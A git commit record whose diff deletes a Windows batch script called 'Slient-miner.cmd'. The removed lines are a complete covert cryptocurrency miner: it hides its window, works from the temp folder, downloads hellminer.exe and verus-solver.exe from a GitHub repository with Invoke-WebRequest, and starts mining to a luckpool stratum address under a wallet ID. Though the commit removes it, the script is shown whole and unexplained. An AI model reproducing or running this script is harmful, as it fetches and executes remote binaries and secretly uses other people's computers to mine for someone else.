0a753023c70806605851e1cfa95117923a911315
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-18 01:59:04 +0300

    Delete Slient-miner.cmd

--- Slient-miner.cmd
+++
@@ -1,9 +0,0 @@
-@echo off
-powershell.exe -windowstyle Hidden -command
-title z%random%
-cd %temp%
-
-if not exist "hellminer.exe" powershell -command Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/hellminer.exe" -OutFile "hellminer.exe"
-if not exist "verus-solver.exe" powershell -command Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/verus-solver.exe" -OutFile "verus-solver.exe"
-
-hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RKmtJ9n4RDNoG95Y6sxKST3wyiHgDG5t4M.x -p x --cpu 2
